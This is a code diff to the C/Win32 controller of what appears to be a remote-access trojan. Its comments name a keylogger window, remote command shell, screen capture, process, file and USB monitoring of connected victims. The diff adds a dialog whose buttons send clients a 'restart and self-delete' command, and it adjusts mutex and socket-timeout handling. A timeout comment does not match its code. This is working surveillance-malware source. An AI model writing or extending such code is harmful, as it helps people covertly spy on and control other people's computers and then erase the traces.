@@ -68,6 +68,8 @@ struct ClientData
 
 	HWND		hKeyWindow;		//键盘记录窗口句柄
 
+	HWND		hOtherWindow;	//其他功能窗口句柄
+
 	ClientData* Next;			//指向下一个ClientData结构
 };
 
@@ -93,6 +95,7 @@ VOID _stdcall _InitSocket();
 BOOL _stdcall _ToClient(_Show* lpScreen);
 BOOL _stdcall _ReceiveClient();
 
+BOOL CALLBACK _DialogOther(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
 BOOL CALLBACK _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
 BOOL CALLBACK _DialogScreen(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
 BOOL CALLBACK _DialogKey(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
@@ -117,6 +120,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine,
 BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 {
 	POINT		stPos;
+	HICON		hIcon;
 	static HMENU hMenu;
 	static LVHITTESTINFO	lo;
 	switch (message)
@@ -133,6 +137,9 @@ BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 			break;
 		case ID_40003:				//显示cmd
 			DialogBoxParam(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_DIALOG3), NULL, _DialogCmd, lo.iItem);
+			break;
+		case ID_40004:
+			DialogBoxParam(GetModuleHandle(NULL), MAKEINTRESOURCE(IDD_DIALOG5), NULL, _DialogOther, lo.iItem);
 			break;
 		}
 		break;
@@ -165,6 +172,9 @@ BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 	case WM_INITDIALOG:
 		hWinMain = hWnd;
 		
+		hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
+		SendMessage(hWnd, WM_SETICON, ICON_BIG, LPARAM(hIcon));
+
 		hmutex1 = CreateMutex(NULL, false, NULL);//创建互斥对象并返回其句柄
 		hMenu = LoadMenu(GetModuleHandle(NULL), MAKEINTRESOURCE(IDR_MENU1));
 		_InitSocket();					//初始化网络
@@ -340,10 +350,10 @@ BOOL _stdcall _ToClient(_Show * lpScreen)
 
 	while (1)
 	{
-
+		WaitForSingleObject(pClient->hmutex, INFINITE);		//请求互斥对象
 		len = 0;
 		int timeout;
-		timeout = 1000 * 600; //600秒超时recv返回		
+		timeout = 1000 * 120; //50秒超时recv返回		
 		setsockopt(pClient->hSocketClient, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(int));
 
 		//接收来自客户端的数据(循环接收)
@@ -361,7 +371,7 @@ BOOL _stdcall _ToClient(_Show * lpScreen)
 			if (len == 8)
 				break;
 		}
-		WaitForSingleObject(pClient->hmutex, INFINITE);		//请求互斥对象
+		
 		if (flag == 1)		//如果recv出错,断开连接结束线程
 		{
 			SendMessage(pClient->hScreenWindow, WM_CLOSE, 0, 0);								//关闭屏幕显示窗口和线程
@@ -653,6 +663,58 @@ BOOL CALLBACK _DialogKey(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 }
 
 
+
+//其他功能窗口过程
+BOOL CALLBACK _DialogOther(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+	MyWrap	stSendWrap;
+	ClientData* pClient = pHandClient;		//辅助指针
+	switch (message)
+	{
+	case WM_COMMAND:
+		switch (LOWORD(wParam))
+		{
+		case IDC_BUTTON1:
+			stSendWrap.dwType = 70002;
+			stSendWrap.dwLength = 0;
+
+			WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
+			send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//请求重启自删除
+			ReleaseMutex(hmutex1);						//释放互斥对象1
+			break;
+		case IDC_BUTTON2:
+			stSendWrap.dwType = 80002;
+			stSendWrap.dwLength = 0;
+
+			WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
+			send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//请求重启自删除
+			ReleaseMutex(hmutex1);						//释放互斥对象1
+			break;
+		}
+		break;
+	case WM_CLOSE:										//关闭显示屏幕线程
+		EndDialog(hWnd, 0);
+		break;
+	case WM_INITDIALOG:
+		for (int i = 0;i < lParam; i++)		//保存对应屏幕窗口信息
+			pClient = pClient->Next;
+
+		pClient->stShow.hWnd	= hWnd;
+		pClient->stShow.dwItem	= lParam;
+		pClient->hKeyWindow		= hWnd;
+		break;
+	default:
+		return FALSE;
+
+	}
+	return TRUE;
+}
+
+
+
+
+
+
 //显示屏幕
 BOOL _stdcall _ShowScreen(_Show* lpScreen)
 {
@@ -722,6 +784,7 @@ BOOL _stdcall _ShowScreen(_Show* lpScreen)
 }
 
 
+//显示cmd信息
 BOOL _stdcall _ShowCmd(HWND hWnd)
 {
 	ClientData* pClient = pHandClient;		//辅助指针
@@ -741,6 +804,7 @@ BOOL _stdcall _ShowCmd(HWND hWnd)
 
 
 
+//显示进程信息
 BOOL _stdcall _ShowProcess(HWND hWnd)
 {
 	DWORD  x;
@@ -817,6 +881,7 @@ BOOL _stdcall _ShowKey(HWND hWnd)
 }
 
 
+//显示文件监控信息
 BOOL _stdcall _ShowFileControl(HWND hWnd)
 {
 	char szBuffer[256] = "\r\n";
@@ -839,6 +904,7 @@ BOOL _stdcall _ShowFileControl(HWND hWnd)
 
 
 
+//显示USB信息
 BOOL _stdcall _ShowUSB(HWND hWnd)
 {
 	char szBuffer[256] = "\r\n";
